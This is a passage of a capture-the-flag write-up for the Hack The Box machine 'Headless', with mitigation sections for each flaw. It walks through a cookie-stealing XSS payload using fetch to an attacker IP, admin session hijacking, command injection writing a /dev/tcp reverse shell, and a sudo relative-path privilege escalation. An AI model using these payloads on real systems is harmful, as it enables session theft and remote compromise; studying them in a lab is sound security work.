hijack an admin session, and access the page. From there, an un-sanitised field on a form is abused to obtain remote code execution via a reverse shell. Privilege escalation is achieved by abusing a <code class="language-plaintext highlighter-rouge">sudo</code> misconfiguration.</p> <h2 id="vulnerabilities-explored">Vulnerabilities explored</h2> <h3 id="cross-site-scripting-xss">Cross-Site Scripting (XSS)</h3> <p>Cross-Site Scripting (XSS) is a type of security vulnerability typically found in web applications. XSS allows attackers to inject malicious scripts into content that other users will view. When this content is viewed, the malicious script executes, which can lead to data theft, session hijacking, and other types of security breaches.</p> <p>There are three main types of XSS:</p> <ol> <li><strong>Reflected XSS</strong>: The malicious script comes from the user’s current request.</li> <li><strong>Stored XSS</strong>: The malicious script is stored on the server (e.g., in a database) and then later sent to users.</li> <li><strong>DOM-based XSS</strong>: The vulnerability is in the client-side code rather than the server-side code.</li> </ol> <p>This machine demonstrated an reflected XSS.</p> <h4 id="example-of-reflected-xss">Example of Reflected XSS</h4> <p>Imagine a scenario where a website has a search function that reflects user input in its response without proper input sanitisation or encoding. For instance:</p> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- Example of a vulnerable HTML page --&gt;</span> 
<span class="nt">&lt;html&gt;</span> 
<span class="nt">&lt;body&gt;</span> 
	<span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"GET"</span> <span class="na">action=</span><span class="s">"search"</span><span class="nt">&gt;</span> 
		<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"query"</span><span class="nt">&gt;</span> 
		<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Search"</span><span class="nt">&gt;</span> 
	<span class="nt">&lt;/form&gt;</span> 
	<span class="nt">&lt;p&gt;</span>You searched for: <span class="cp">&lt;?php echo $_GET['query']; ?&gt;</span><span class="nt">&lt;/p&gt;</span> 
<span class="nt">&lt;/body&gt;</span> 
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div> <p>If a user inputs a search term like <code class="language-plaintext highlighter-rouge">&lt;script&gt;alert('XSS')&lt;/script&gt;</code>, and the server includes this input in the HTML response without sanitising, the script will execute in the user’s browser. This script could be something more malicious, like stealing cookies or other sensitive information.</p> <h4 id="mitigation">Mitigation</h4> <ul> <li><strong>Input Sanitisation</strong>: Always sanitize all inputs, especially those that can be reflected back in any form to the user. This includes less obvious fields like HTTP headers (<em>hint: that’s the vector for this machine)</em>.</li> <li><strong>Content Security Policy (CSP)</strong>: Implementing a robust CSP can help prevent XSS by restricting the sources from which scripts can be loaded and executed.</li> <li><strong>Secure Coding Practices</strong>: Employ secure coding practices that involve encoding user inputs so that they are treated as data rather than executable code.</li> </ul> <h3 id="cookie-manipulation">Cookie manipulation</h3> <p>Cookie manipulation involves altering the contents of a cookie before it is sent to the server. This could involve changing session tokens, user IDs, or other data stored in cookies to escalate privileges or change user settings.</p> <h4 id="mitigation-1">Mitigation</h4> <ul> <li><strong>Use Secure Cookies</strong>: Set cookies with the <code class="language-plaintext highlighter-rouge">Secure</code> attribute to ensure they are only sent over HTTPS, preventing transmission over unencrypted connections.</li> <li><strong>HttpOnly Attribute</strong>: Use the <code class="language-plaintext highlighter-rouge">HttpOnly</code> attribute to prevent access to cookie values via JavaScript. This helps protect against XSS attacks that attempt to steal cookies.</li> <li><strong>SameSite Attribute</strong>: Use the <code class="language-plaintext highlighter-rouge">SameSite</code> attribute to restrict how cookies are sent with cross-site requests. This can help prevent cross-site request forgery (CSRF) attacks.</li> <li><strong>Cookie Integrity</strong>: Implement mechanisms to ensure the integrity of cookie values, such as signing cookies with a secret key. An integrity check can detect if the cookie has been tampered with.</li> <li><strong>Strict Validation</strong>: Validate all input from cookies before use. Do not trust data stored in cookies without validation, especially for access control decisions.</li> </ul> <h3 id="session-hijacking">Session hijacking</h3> <p>Session hijacking, also known as session takeover, involves exploiting a valid computer session—most often by stealing or predicting a valid session token—to gain unauthorized access to information or services in a computer system.</p> <h4 id="mitigation-2">Mitigation</h4> <ul> <li><strong>Session Expiration</strong>: Implement session expiration and timeout mechanisms that automatically log users out after a period of inactivity or after a maximum session duration.</li> <li><strong>Regenerate Session IDs</strong>: Regenerate session IDs after a successful login to prevent session fixation attacks, where an attacker fixes the session ID before the user logs in.</li> <li><strong>Monitor and Validate Sessions</strong>: Monitor session activity for anomalies and validate sessions based on multiple attributes (e.g., IP address, User-Agent) to detect and prevent hijacking.</li> </ul> <h3 id="command-injection">Command injection</h3> <p>Command injection vulnerabilities can occur in any place where an application passes user input to a system shell command. If the user input is not properly sanitized, attackers can append additional commands or alter the intended command, leading to potentially severe consequences such as unauthorized access, data leakage, or server compromise.</p> <h4 id="mitigation-3">Mitigation</h4> <ul> <li><strong>Proper Input Validation</strong>: Ensure that all user inputs are validated against a strict set of rules. Only allow known good inputs to pass through and be used in commands.</li> <li><strong>Avoid Using Shell Commands</strong>: Where possible, avoid using shell commands altogether. Use built-in library functions provided by your programming language or framework that perform the desired operations without invoking the shell.</li> <li><strong>Use Safe APIs</strong>: If you must execute system commands, use safe APIs that avoid shell execution, such as parameterized functions or APIs that do not involve the shell.</li> <li><strong>Escaping Special Characters</strong>: If system commands must include user input, ensure that special characters are properly escaped so that they are treated as literal values rather than executable code. However, escaping should be a last resort after safer alternatives have been considered.</li> <li><strong>Use Least Privilege Principles</strong>: Run applications with the minimum permissions necessary. Restricting the privileges of the application environment can limit the damage an attacker can do if they manage to inject commands.</li> </ul> <h3 id="sudo-misconfiguration">Sudo misconfiguration</h3> <p>The <code class="language-plaintext highlighter-rouge">sudoers</code> file controls which users can execute commands with elevated privileges. If this file is configured to allow a user to run certain commands as the superuser without requiring a password, it may lead to security risks if the commands are inherently dangerous or can be exploited.</p> <p>Some binaries, when executed with elevated privileges, can be used to perform tasks that compromise the security of the system. For instance, if a binary allows file manipulation, code execution, or access to the shell, an attacker can use it to gain higher privileges or execute arbitrary commands.</p> <h4 id="mitigation-strategies">Mitigation Strategies</h4> <ul> <li><strong>Review and Restrict Sudo Policies</strong>: Regularly audit the <code class="language-plaintext highlighter-rouge">sudoers</code> file to ensure that only necessary permissions are granted. Commands that can be exploited for privilege escalation should not be runnable with elevated privileges without strong justifications and controls.</li> <li><strong>Password Protections</strong>: Require passwords for sudo access to add an extra layer of security, ensuring that only authenticated users can execute commands with elevated privileges.</li> <li><strong>Security Training and Awareness</strong>: Educate administrators and users about the risks associated with improper sudo configurations and encourage security best practices.</li> <li><strong>Use Secure Programming Practices</strong>: When developing applications that will be used in environments with sudo access, ensure they are securely coded to prevent exploitation.</li> <li><strong>Regular Security Audits</strong>: Regularly perform security audits and vulnerability assessments to identify and mitigate risks associated with privilege escalation.</li> </ul> <h3 id="insecure-coding-practices">Insecure coding practices</h3> <p>Insecure coding practices can lead to significant vulnerabilities, allowing attackers to exploit the application. Here are common insecure coding practices observed:</p> <ul> <li><strong>Improper Input Sanitisation</strong>: Failing to sanitise user inputs properly can lead to various forms of injection attacks, including SQL, command, and script injections. In the context of the “Headless” box, the lack of sanitisation in the date selection field allowed for command injection, demonstrating how critical rigorous input validation is to security.</li> <li><strong>Using Relative Paths for File Execution</strong>: Utilising relative paths for file execution, as seen with the <code class="language-plaintext highlighter-rouge">initdb.sh</code> script in the <code class="language-plaintext highlighter-rouge">syscheck</code> binary, poses a security risk. It can lead to unauthorised file execution if an attacker can place a malicious file in the expected path, leading to privilege escalation.</li> </ul> <h4 id="mitigation-4">Mitigation</h4> <ul> <li><strong>Implement Thorough Input Validation</strong>: Ensure all user inputs are validated against a strict set of rules. Reject any input that does not strictly conform to expected patterns, especially in command execution or database queries.</li> <li><strong>Use Absolute Paths</strong>: Always use absolute paths when referencing executables or other files within code. This practice prevents directory traversal attacks and ensures that the application only accesses files explicitly defined in the code.</li> <li><strong>Adopt Secure Coding Standards</strong>: Follow secure coding guidelines and standards such as OWASP Top 10 to understand and mitigate common vulnerabilities. Regular code reviews and security audits can also help catch and fix insecure practices early in the development lifecycle.</li> </ul> <h2 id="tools">Tools</h2> <ul> <li>Nmap</li> <li>Burpsuite</li> </ul> <h2 id="tactics-and-methods">Tactics and Methods</h2> <h4 id="exploiting-a-reflected-xss-vulnerability-to-steal-cookies">Exploiting a Reflected XSS vulnerability to steal cookies</h4> <ul> <li>The webform fields were sanitised, but the HTTP headers were not. Exploiting the lack of sanitisation on the <code class="language-plaintext highlighter-rouge">User-Agent</code> (or <code class="language-plaintext highlighter-rouge">Accept</code>) field in the headers allows for a cookie to be stolen.</li> </ul> <h4 id="authentication-bypass-via-cookie-manipulation-and-session-hijacking">Authentication bypass via cookie manipulation and session hijacking</h4> <ul> <li>By manipulating the HTTP headers to include a stolen cookie, a admin session was hijacked and unauthorised access to a dashboard obtained.</li> </ul> <h4 id="remote-code-execution-via-command-injection">Remote code execution via command injection</h4> <ul> <li>By exploiting an field on the dashboard that was not sanitised, a reverse shell was created and executed server-side.</li> </ul> <h4 id="abusing-sudo-to-achieve-privilege-escalation">Abusing <code class="language-plaintext highlighter-rouge">Sudo</code> to achieve privilege escalation</h4> <ul> <li>A relative path within a binary the standard user could run as <code class="language-plaintext highlighter-rouge">sudo</code> with no password was exploited to call a malicious script to execute a reverse shell as root.</li> </ul> <hr/> <h1 id="enumeration">Enumeration</h1> <p>As always, begin with Nmap scanning</p> <h2 id="nmap-scanning">Nmap scanning</h2> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>emdeh㉿kali<span class="o">)</span>-[~/Documents/htb-machines/headless/scans]
└─<span class="nv">$ </span>nmap <span class="nt">-A</span> 10.129.27.108 | <span class="nb">tee </span>nmap-output.txt
</code></pre></div></div> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-04-12 23:51 EDT
Nmap scan report <span class="k">for </span>10.129.27.108
Host is up <span class="o">(</span>0.32s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 998 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca <span class="o">(</span>ED25519<span class="o">)</span>
5000/tcp open  upnp?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Sat, 13 Apr 2024 03:52:24 GMT
|     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
|     Content-Length: 2799
|     Set-Cookie: <span class="nv">is_admin</span><span class="o">=</span>InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/
|     Connection: close
|     &lt;<span class="o">!</span>DOCTYPE html&gt;
|     &lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">"en"</span><span class="o">&gt;</span>
|     &lt;<span class="nb">head</span><span class="o">&gt;</span>
|     &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"UTF-8"</span><span class="o">&gt;</span>
|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"viewport"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"width=device-width, initial-scale=1.0"</span><span class="o">&gt;</span>
|     &lt;title&gt;Under Construction&lt;/title&gt;
|     &lt;style&gt;
|     body <span class="o">{</span>
|     font-family: <span class="s1">'Arial'</span>, sans-serif<span class="p">;</span>
|     background-color: <span class="c">#f7f7f7;</span>
|     margin: 0<span class="p">;</span>
|     padding: 0<span class="p">;</span>
|     display: flex<span class="p">;</span>
|     justify-content: center<span class="p">;</span>
|     align-items: center<span class="p">;</span>
|     height: 100vh<span class="p">;</span>
|     .container <span class="o">{</span>
|     text-align: center<span class="p">;</span>
|     background-color: <span class="c">#fff;</span>
|     border-radius: 10px<span class="p">;</span>
|     box-shadow: 0px 0px 20px rgba<span class="o">(</span>0, 0, 0, 0.2<span class="o">)</span><span class="p">;</span>
|   RTSPRequest:
|     &lt;<span class="o">!</span>DOCTYPE HTML&gt;
|     &lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">"en"</span><span class="o">&gt;</span>
|     &lt;<span class="nb">head</span><span class="o">&gt;</span>
|     &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"utf-8"</span><span class="o">&gt;</span>
|     &lt;title&gt;Error response&lt;/title&gt;
|     &lt;/head&gt;
|     &lt;body&gt;
|     &lt;h1&gt;Error response&lt;/h1&gt;
|     &lt;p&gt;Error code: 400&lt;/p&gt;
|     &lt;p&gt;Message: Bad request version <span class="o">(</span><span class="s1">'RTSP/1.0'</span><span class="o">)</span>.&lt;/p&gt;
|     &lt;p&gt;Error code explanation: 400 - Bad request syntax or unsupported method.&lt;/p&gt;
|     &lt;/body&gt;
|_    &lt;/html&gt;
</code></pre></div></div> <h3 id="findings">Findings</h3> <ol> <li>Port 22</li> <li>Port 5000 with some additional details</li> </ol> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>5000/tcp open  upnp?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Sat, 13 Apr 2024 03:52:24 GMT
|     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
|     Content-Length: 2799
|     Set-Cookie: <span class="nv">is_admin</span><span class="o">=</span>InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/
|     Connection: close
|     &lt;<span class="o">!</span>DOCTYPE html&gt;
|     &lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">"en"</span><span class="o">&gt;</span>
|     &lt;<span class="nb">head</span><span class="o">&gt;</span>
|     &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"UTF-8"</span><span class="o">&gt;</span>
|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"viewport"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"width=device-width, initial-scale=1.0"</span><span class="o">&gt;</span>
|     &lt;title&gt;Under Construction&lt;/title&gt;
</code></pre></div></div> <p>The server header indicates the use of Werkzeug/2.2.2 Python/3.11.2, suggesting a Python-based web application, possibly Flask. The presence of a cookie with the name <code class="language-plaintext highlighter-rouge">is_admin</code> is particularly interesting. It suggests that the application might be vulnerable to cookie tampering or session management vulnerabilities.</p> <p>Possible vectors include:</p> <ul> <li><strong>Cookie Manipulation:</strong> You can explore manipulating this cookie. Try decoding it if it’s base64-encoded, or if it looks like a serialized Python object, consider object deserialization attacks.</li> <li><strong>Directory Traversal/File Inclusion:</strong> Given it’s a web server, you might also look into directory traversal or file inclusion vulnerabilities.</li> </ul> <h2 id="server-enumeration">Server enumeration</h2> <p>Dirsearch is used to find other pages to enumerate on.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>emdeh㉿kali<span class="o">)</span>-[~/Documents/htb-machines/headless/scans]
└─<span class="nv">$ </span>dirsearch <span class="nt">-u</span> http://10.129.27.108:5000
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 <span class="o">(</span>_||| _<span class="o">)</span> <span class="o">(</span>/_<span class="o">(</span>_|| <span class="o">(</span>_| <span class="o">)</span>

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Documents/htb-machines/headless/scans/reports/http_10.129.27.108_5000/_24-04-13_00-10-00.txt

Target: http://10.129.27.108:5000/

<span class="o">[</span>00:10:00] Starting:
<span class="o">[</span>00:12:25] 401 -  317B  - /dashboard
<span class="o">[</span>00:14:28] 200 -    2KB - /support

Task Completed
</code></pre></div></div> <p>Two pages are identified:</p> <ol> <li><code class="language-plaintext highlighter-rouge">http://10.129.27.108:5000/dashboard</code> results in Unauthorized.</li> <li><code class="language-plaintext highlighter-rouge">http://10.129.27.108:5000/support</code> returns a webform.</li> </ol> <p><img src="/assets/img/2024/2024-03-headless/webform.png" alt="webform.png" class="auto-resize"/></p> <h2 id="webform-enumeration">Webform enumeration</h2> <p>Using Burpsuite, the responses to the submissions can be monitored.</p> <p>A benign submissions results in a unremarkable POST request with a 200 status code.</p> <p>Sending an url-encoded reverse shell returns a <strong>Hacking Attempt Detected</strong>* warning, with the previously identified cookie displayed.</p> <p><img src="/assets/img/2024/2024-03-headless/url-encoded-shell.png" alt="url-encoded-shell.png" class="auto-resize"/></p> <p><img src="/assets/img/2024/2024-03-headless/hacking-attempt-detected.png" alt="hacking-attempt-detected.png" class="auto-resize"/></p> <p>The cookie’s first part decodes from Base-64 to <code class="language-plaintext highlighter-rouge">user</code>. The second part is not clearly discernible. If it were a JWT the second part would be the payload, so perhaps this represents unique users.</p> <p>The inclusion of the cookie in various locations suggests that perhaps other cookies can be stolen.</p> <h1 id="stealing-cookies-via-a-reflected-xss">Stealing cookies via a Reflected XSS</h1> <h2 id="user-agent-as-an-injection-point">User-Agent as an injection point</h2> <p>The server is displaying an error page when a hacking attempt is detected, and this page includes the <code class="language-plaintext highlighter-rouge">User-Agent</code> string, along with other client request information. If this information is not sanitised before being included in the HTML of the error page, it could lead to an XSS vulnerability.</p> <h2 id="the-payload">The payload</h2> <p>The following payload uses an error-handling method to execute JavaScript.</p> <p><code class="language-plaintext highlighter-rouge">&lt;img src=x onerror=fetch('http://IP/?c='+document.cookie);&gt;</code></p> <ul> <li><strong><code class="language-plaintext highlighter-rouge">&lt;img src=x&gt;</code></strong>: This part attempts to load an image from a source that doesn’t exist (<code class="language-plaintext highlighter-rouge">x</code>), which will naturally cause an error.</li> <li><strong><code class="language-plaintext highlighter-rouge">onerror=fetch(...)</code></strong>: The <code class="language-plaintext highlighter-rouge">onerror</code> attribute of the <code class="language-plaintext highlighter-rouge">&lt;img&gt;</code> tag fires when an error occurs (like failing to load the image). It triggers the fetch API call.</li> <li><strong><code class="language-plaintext highlighter-rouge">fetch('http://IP/?c='+document.cookie)</code></strong>: This JavaScript fetches a URL, appending the document’s cookies as a query parameter.</li> </ul> <p>The <code class="language-plaintext highlighter-rouge">fetch</code> part is a classic technique for stealing cookies if the fetched domain is controlled by the attacker which, in this case, it is.</p> <h2 id="executing-the-attack">Executing the attack</h2> <p>To execute the attack, Burpsuite can be used to repeat the POST method used to submit a form.</p> <p>The payload is then placed in the <code class="language-plaintext highlighter-rouge">User-Agent</code> field. However, any of the fields that are rendered in the HTML of the error page could potentially work. For example, replacing the <code class="language-plaintext highlighter-rouge">Accept</code> value with the payload also worked in this instance.</p> <p>The <code class="language-plaintext highlighter-rouge">message</code> field of the form needs to include something that will trigger the error. This could be the reverse shell attempted earlier or a copy of the payload in the <code class="language-plaintext highlighter-rouge">User-Agent</code> field - it doesn’t matter, as long as it triggers the error.</p> <blockquote> <p><em>Including the cookie stealing payload in the <code class="language-plaintext highlighter-rouge">message</code> field is only to trigger the error; it does not actually execute from here because this field is not displayed back on the error page.</em></p> </blockquote> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /support HTTP/1.1
Host: 10.129.27.108:5000
Content-Length: 140
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.129.27.108:5000
Content-Type: application/x-www-form-urlencoded
User-Agent: &lt;img src=x onerror=fetch('http://10.10.14.6/?c='+document.cookie);&gt;
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.129.27.108:5000/support
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
Connection: close

fname=emdeh&amp;lname=emdeh&amp;email=emdeh%40emdeh.com&amp;phone=emdeh&amp;message=abc; &lt;img src=x onerror=fetch('http://10.10.14.6/?c='+document.cookie);&gt;
</code></pre></div></div> <p>Once the payload is ready, a webserver is started to receive the <code class="language-plaintext highlighter-rouge">document.cookie</code> value as a query parameter to the malicious GET request the server is inadvertently tricked into sending.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>emdeh㉿kali<span class="o">)</span>-[~/Documents]
└─<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.129.27.108 - - <span class="o">[</span>13/Apr/2024 01:12:14] <span class="s2">"GET /?c=is_admin=ImFkbWluIg.&lt;SNIP&gt; HTTP/1.1"</span> 200 -

</code></pre></div></div> <h1 id="cookie-manipulation-1">Cookie manipulation</h1> <p>Putting the captured cookie through a decoder reveals it has a header value of <code class="language-plaintext highlighter-rouge">admin</code>. Given the original cookie had a value of <code class="language-plaintext highlighter-rouge">user</code>, it would appear an administrator cookie has been obtained.</p> <p>Including the cookie in a request to the <code class="language-plaintext highlighter-rouge">/dashboard</code> page successfully hijacks a admin session and reveals the Administrator Dashboard with a simple form to generate a website health report with a <code class="language-plaintext highlighter-rouge">Select Date</code> field.</p> <p><img src="/assets/img/2024/2024-03-headless/admin-dashboard.png" alt="admin-dashboard.png" class="auto-resize"/></p> <h1 id="enumerating-the-select-date-field">Enumerating the <code class="language-plaintext highlighter-rouge">Select Date</code> field</h1> <p>Testing to see if the <code class="language-plaintext highlighter-rouge">Select Date</code> field is properly sanitised quickly suggests it is not. Including <code class="language-plaintext highlighter-rouge">;ls</code> returns a list of files to the browser as shown below.</p> <p><img src="/assets/img/2024/2024-03-headless/admin-dashboard-ls.png" alt="admin-dashboard-ls.png" class="auto-resize"/></p> <p><img src="/assets/img/2024/2024-03-headless/admin-dashboard-ls-show.png" alt="admin-dashboard-ls-show.png" class="auto-resize"/></p> <h1 id="command-injection-1">Command injection</h1> <p>Attempting to exploit this to execute a reverse shell fails. Another option is to attempt to create a reverse shell in a file, and then subsequently call the file.</p> <p>Try to create a reverse shell on the server, the following command is injected into the field:</p> <p><code class="language-plaintext highlighter-rouge">echo '#!/bin/bash' &gt; reverse_shell.sh &amp;&amp; echo 'sh -i &gt;&amp; /dev/tcp/10.10.14.6/4321 0&gt;&amp;1' &gt;&gt; reverse_shell.sh</code></p> <p>The command is URL-encoded and submitted, making sure to include the stolen cookie in the HTTP headers.</p> <p><img src="/assets/img/2024/2024-03-headless/data-payload.png" alt="data-payload.png" class="auto-resize"/></p> <p>To validate that the file has been created successfully, another <code class="language-plaintext highlighter-rouge">ls</code> command can be sent.</p> <p><img src="/assets/img/2024/2024-03-headless/rev-shell-confirm.png" alt="rev-shell-confirm.png" class="auto-resize"/></p> <p>After confirming the file was successfully created, it can be called and the resulting shell caught on a netcat listener as shown below.</p> <p><img src="/assets/img/2024/2024-03-headless/rev-shell-execute.png" alt="rev-shell-execute.png" class="auto-resize"/></p> <p>And the first flag found.</p> <p><img src="/assets/img/2024/2024-03-headless/first-flag.png" alt="first-flag.png" class="auto-resize"/></p> <h1 id="system-enumeration">System enumeration</h1> <p>As always, checking for any <code class="language-plaintext highlighter-rouge">sudo</code> rights is a good place to start.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">whoami
</span>dvir
<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>dvir on headless:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin,
    use_pty

User dvir may run the following commands on headless:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/syscheck

</code></pre></div></div> <p>In this case, the user can execute <code class="language-plaintext highlighter-rouge">/usr/bin/syscheck</code> as sudo with no password.</p> <p>Checking what the binary is reveals a bash script that needs elevated privileges to check some values and retrieve system information.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>strings /usr/bin/syscheck
<span class="c">#!/bin/bash</span>
<span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$EUID</span><span class="s2">"</span> <span class="nt">-ne</span> 0 <span class="o">]</span><span class="p">;</span> <span class="k">then
  </span><span class="nb">exit </span>1
<span class="nv">last_modified_time</span><span class="o">=</span><span class="si">$(</span>/usr/bin/find /boot <span class="nt">-name</span> <span class="s1">'vmlinuz*'</span> <span class="nt">-exec</span> <span class="nb">stat</span> <span class="nt">-c</span> %Y <span class="o">{}</span> + | /usr/bin/sort <span class="nt">-n</span> | /usr/bin/tail <span class="nt">-n</span> 1<span class="si">)</span>
<span class="nv">formatted_time</span><span class="o">=</span><span class="si">$(</span>/usr/bin/date <span class="nt">-d</span> <span class="s2">"@</span><span class="nv">$last_modified_time</span><span class="s2">"</span> +<span class="s2">"%d/%m/%Y %H:%M"</span><span class="si">)</span>
/usr/bin/echo <span class="s2">"Last Kernel Modification Time: </span><span class="nv">$formatted_time</span><span class="s2">"</span>
<span class="nv">disk_space</span><span class="o">=</span><span class="si">$(</span>/usr/bin/df <span class="nt">-h</span> / | /usr/bin/awk <span class="s1">'NR==2 {print $4}'</span><span class="si">)</span>
/usr/bin/echo <span class="s2">"Available disk space: </span><span class="nv">$disk_space</span><span class="s2">"</span>
<span class="nv">load_average</span><span class="o">=</span><span class="si">$(</span>/usr/bin/uptime | /usr/bin/awk <span class="nt">-F</span><span class="s1">'load average:'</span> <span class="s1">'{print $2}'</span><span class="si">)</span>
/usr/bin/echo <span class="s2">"System load average: </span><span class="nv">$load_average</span><span class="s2">"</span>
<span class="k">if</span> <span class="o">!</span> /usr/bin/pgrep <span class="nt">-x</span> <span class="s2">"initdb.sh"</span> &amp;&gt;/dev/null<span class="p">;</span> <span class="k">then</span>
  /usr/bin/echo <span class="s2">"Database service is not running. Starting it..."</span>
  ./initdb.sh 2&gt;/dev/null
<span class="k">else</span>
  /usr/bin/echo <span class="s2">"Database service is running."</span>
<span class="nb">exit </span>0
<span class="err">$</span>
</code></pre></div></div> <p>The <code class="language-plaintext highlighter-rouge">if</code> statement is particularly interesting. It checks if a script named <code class="language-plaintext highlighter-rouge">initdb.sh</code> is currently running. If it’s not running, it attempts to start this script and prints a message indicating it’s starting the database service. If it is running, it prints that the database service is running.</p> <p>The file can be created in the present working directory to impersonate the <code class="language-plaintext highlighter-rouge">initdb.sh</code> script. If <code class="language-plaintext highlighter-rouge">/usr/bin/syscheck</code> is executed from the same directory to where the fake <code class="language-plaintext highlighter-rouge">initdb.sh</code> script is created, it will execute this file because it uses a relative path to locate and run <code class="language-plaintext highlighter-rouge">initdb.sh</code>.</p> <h2 id="relative-path-vs-absolute-path">Relative path vs. Absolute path</h2> <p>In the original script, the problematic part is:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="o">!</span> /usr/bin/pgrep <span class="nt">-x</span> <span class="s2">"initdb.sh"</span> &amp;&gt;/dev/null<span class="p">;</span> <span class="k">then</span>
  ./initdb.sh 2&gt;/dev/null
<span class="k">else</span>
  /usr/bin/echo <span class="s2">"Database service is running."</span>

</code></pre></div></div> <p>Here, <code class="language-plaintext highlighter-rouge">./initdb.sh</code> refers to a relative path, which means it looks for <code class="language-plaintext highlighter-rouge">initdb.sh</code> in the current working directory.</p> <p>Here is a version of the script using absolute paths.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
<span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$EUID</span><span class="s2">"</span> <span class="nt">-ne</span> 0 <span class="o">]</span><span class="p">;</span> <span class="k">then
  </span><span class="nb">exit </span>1
<span class="k">fi

</span><span class="nv">last_modified_time</span><span class="o">=</span><span class="si">$(</span>/usr/bin/find /boot <span class="nt">-name</span> <span class="s1">'vmlinuz*'</span> <span class="nt">-exec</span> <span class="nb">stat</span> <span class="nt">-c</span> %Y <span class="o">{}</span> + | /usr/bin/sort <span class="nt">-n</span> | /usr/bin/tail <span class="nt">-n</span> 1<span class="si">)</span>
<span class="nv">formatted_time</span><span class="o">=</span><span class="si">$(</span>/usr/bin/date <span class="nt">-d</span> <span class="s2">"@</span><span class="nv">$last_modified_time</span><span class="s2">"</span> +<span class="s2">"%d/%m/%Y %H:%M"</span><span class="si">)</span>
/usr/bin/echo <span class="s2">"Last Kernel Modification Time: </span><span class="nv">$formatted_time</span><span class="s2">"</span>
<span class="nv">disk_space</span><span class="o">=</span><span class="si">$(</span>/usr/bin/df <span class="nt">-h</span> / | /usr/bin/awk <span class="s1">'NR==2 {print $4}'</span><span class="si">)</span>
/usr/bin/echo <span class="s2">"Available disk space: </span><span class="nv">$disk_space</span><span class="s2">"</span>
<span class="nv">load_average</span><span class="o">=</span><span class="si">$(</span>/usr/bin/uptime | /usr/bin/awk <span class="nt">-F</span><span class="s1">'load average:'</span> <span class="s1">'{print $2}'</span><span class="si">)</span>
